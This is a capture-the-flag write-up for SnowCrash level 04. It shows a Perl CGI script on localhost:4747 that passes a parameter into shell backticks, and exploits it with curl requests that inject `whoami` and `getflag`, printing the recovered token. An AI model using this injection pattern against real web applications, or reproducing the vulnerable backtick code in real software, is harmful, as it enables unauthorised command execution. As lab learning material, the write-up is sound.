Level04 instructions

We have a perl executable file on the home directory
After executing it, we didn't get anything but we can notice from the output, a webserver may be running on the machine. also we can notice it after cating the content of the file. 
```
level04@SnowCrash:~$ ./level04.pl
Content-type: text/html


level04@SnowCrash:~$ ./level04.pl sd
Content-type: text/html

level04@SnowCrash:~$ cat level04.pl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```
The script print the value of the "x" parameter after parsing it from the argument.
```
level04@SnowCrash:~$ ./level04.pl x=hamza
Content-type: text/html

hamza
level04@SnowCrash:~$ curl localhost:4747?x=hamza
hamza
```
As we can see the second print have backticks (`...`), which allows arbitrary command execution. means wa can try to nested command execution.
```
level04@SnowCrash:~$ curl localhost:4747?x=`whoami`
level04
```
we the command executed as level04 not flag04. Let's find the vhost of this webserver
```
level04@SnowCrash:~$ ps aux | grep www-data
www-data  1497  0.0  0.1  21420  4244 ?        S    Feb07   0:04 /usr/sbin/apache2 -k start
www-data  1498  0.0  0.1  21412  4252 ?        S    Feb07   0:00 /usr/sbin/apache2 -k start
www-data  1499  0.0  0.1  21420  4248 ?        S    Feb07   0:00 /usr/sbin/apache2 -k start
www-data  1500  0.0  0.1  21420  4248 ?        S    Feb07   0:00 /usr/sbin/apache2 -k start
www-data  1501  0.0  0.1  21420  4248 ?        S    Feb07   0:00 /usr/sbin/apache2 -k start
www-data  5955  0.0  0.1  21420  4248 ?        S    09:29   0:00 /usr/sbin/apache2 -k start
level04   6037  0.0  0.0   4384   804 pts/0    S+   09:40   0:00 grep --color=auto www-data
level04@SnowCrash:~$ find / -user flag04 2>/dev/null
/var/www/level04
/var/www/level04/level04.pl
level04@SnowCrash:~$ cat /etc/apache2/sites-enabled/level05.conf
<VirtualHost *:4747>
	DocumentRoot	/var/www/level04/
	SuexecUserGroup flag04 level04
	<Directory /var/www/level04>
		Options +ExecCGI
		DirectoryIndex level04.pl
		AllowOverride None
		Order allow,deny
		Allow from all
		AddHandler cgi-script .pl
	</Directory>
</VirtualHost>
```
From here we can see that even we had level04 on the `whoami` command the `getflag` will work cause SuexecUserGroup flag04 level04 will change the group of the user to flag04
```
level04@SnowCrash:~$ curl http://localhost:4747?'x=`getflag`'
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
level04@SnowCrash:~$ su level05
Password:
level05@SnowCrash:~$
```